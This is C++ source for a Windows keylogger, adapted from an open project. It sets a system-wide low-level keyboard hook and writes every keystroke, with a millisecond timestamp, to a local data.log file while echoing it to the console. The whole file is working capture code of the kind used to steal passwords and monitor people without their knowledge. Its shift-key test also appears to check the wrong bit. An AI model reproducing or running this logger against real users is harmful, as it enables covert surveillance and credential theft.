/*
Adapted from GiacomoLaw/Keylogger
*/

#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <chrono>
#include <map>

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname{
		{VK_BACK, "[BACKSPACE]"},
		{VK_RETURN, "[RETURN]"},
		{VK_SPACE, "[SPACE]"},
		{VK_TAB, "[TAB]"},
		{VK_SHIFT, "[SHIFT]"},
		{VK_LSHIFT, "[LSHIFT]"},
		{VK_RSHIFT, "[RSHIFT]"},
		{VK_CONTROL, "[CONTROL]"},
		{VK_LCONTROL, "[LCONTROL]"},
		{VK_RCONTROL, "[RCONTROL]"},
		{VK_MENU, "[ALT]"},
		{VK_LWIN, "[LWIN]"},
		{VK_RWIN, "[RWIN]"},
		{VK_ESCAPE, "[ESCAPE]"},
		{VK_END, "[END]"},
		{VK_HOME, "[HOME]"},
		{VK_LEFT, "[LEFT]"},
		{VK_RIGHT, "[RIGHT]"},
		{VK_UP, "[UP]"},
		{VK_DOWN, "[DOWN]"},
		{VK_PRIOR, "[PG_UP]"},
		{VK_NEXT, "[PG_DOWN]"},
		{VK_OEM_PERIOD, "."},
		{VK_DECIMAL, "."},
		{VK_OEM_PLUS, "+"},
		{VK_OEM_MINUS, "-"},
		{VK_ADD, "+"},
		{VK_SUBTRACT, "-"},
		{VK_CAPITAL, "[CAPSLOCK]"},
};
#endif
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		std::cout << "Failed to install hook!" << std::endl;
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
	std::stringstream output;
	HKL layout = NULL;

	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
	// get time
	unsigned long long now = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count();
	// instead of opening and closing file handlers every time, keep file open and flush.
	output_file << now << "," << output.str() << std::endl;
	output_file.flush();

	std::cout << output.str();

	return 0;
}

int main()
{
	// open output file in append mode
	const char *output_filename = "data.log";
	std::cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, std::ios_base::app);

	// set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
